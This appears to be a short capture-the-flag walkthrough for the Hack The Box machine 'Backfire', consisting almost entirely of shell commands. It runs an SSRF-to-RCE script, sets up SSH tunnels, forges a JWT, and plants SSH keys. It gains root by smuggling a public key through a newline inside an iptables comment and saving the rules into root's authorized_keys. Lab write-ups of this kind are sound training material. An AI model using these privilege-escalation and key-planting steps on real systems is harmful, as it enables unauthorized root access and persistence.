# Backfire HTB

```bash
python3 ./SSRF_RCE.py
```

```bash
ssh -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000 ilya@backfire.htb -i ./key
```

```bash
python3 ./gen_jwt.py
```

```bash
# On the console
ssh-keygen -t ed25519 -f /home/sergej/.ssh/id_rsa -N "" ; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys ; chmod 600 ~/.ssh/authorized_keys ; cat ~/.ssh/authorized_keys ; cat ~/.ssh/id_rsa
```

Copy key from the output into key_sergej

```bash
ssh sergej@backfire.htb -i ./key_sergej
```

```bash
ssh-keygen -t ed25519 -f key_root -N ""
```

Use the private key

```bash
#On the remote host
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqt/ArZvN9y5m4yqhYjWrAg0xaaYPuS8p4VdKYwMOGC root@exegol-CTF
\n'

sudo iptables-save -f /root/.ssh/authorized_keys
```

ssh as root
